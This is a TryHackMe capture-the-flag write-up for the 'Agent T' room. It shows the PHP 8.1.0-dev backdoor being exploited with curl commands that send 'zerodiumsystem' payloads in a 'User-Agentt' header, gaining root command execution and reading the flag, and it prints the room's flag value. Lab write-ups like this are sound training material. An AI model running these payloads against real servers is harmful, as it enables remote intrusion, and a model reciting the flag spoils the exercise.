# Agent T — TryHackMe

> Found a backdoor in PHP 8.1.0-dev. It's called "zerodiumsystem" — whoever wrote this was feeling pretty cocky.

---

## First Look

```bash
nmap -sV <TARGET_IP>
```

Only port 80 open. Hit the website, looks like a generic admin dashboard template. But something felt off — the page loaded way too fast, like something was running behind the scenes.

---

## Suspicious Header

Caught the request in Burp Suite. Checked the response headers:

```
X-Powered-By: PHP/8.1.0-dev
```

Wait, hold up. PHP 8.1.0-dev? What's a development version doing in production? Hit up Exploit-DB immediately. And yeah, there's a known RCE for this.

---

## Backdoor Details

The exploit logic is this: not `User-Agent`, but `User-Agentt` (double t). So the developer "hid" the backdoor with a tiny typo — except this "typo" was intentional. Payload:

```
User-Agentt: zerodiumsystem('whoami')
```

The `zerodiumsystem` function — Zerodium is an exploit buying platform. Using that name is like saying "look how valuable this vulnerability is." A bit flashy, a bit annoying.

---

## Exploit

Tested with curl:

```bash
curl -H "User-Agentt: zerodiumsystem('id')" http://<TARGET_IP>/
```

Response came back with `uid=0(root)`. Straight to root. No pivoting, no lateral movement needed.

Then hunted for the flag:

```bash
curl -H "User-Agentt: zerodiumsystem('find / -name flag.txt 2>/dev/null')" http://<TARGET_IP>/
```

Found `/flag.txt`. Read it:

```bash
curl -H "User-Agentt: zerodiumsystem('cat /flag.txt')" http://<TARGET_IP>/
```

And there it was:

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```

---

## What I Learned

- Development versions should never run in production. See "dev" in the label? Dig deeper.
- Backdoors aren't always hidden — sometimes they stand right there with their names. Like `zerodiumsystem`.
- This exploit dropped in 2021, still shows up in active CTFs. Old vulnerabilities don't die, they just get forgotten.

---

> Author: Miraç | Date: May 2026
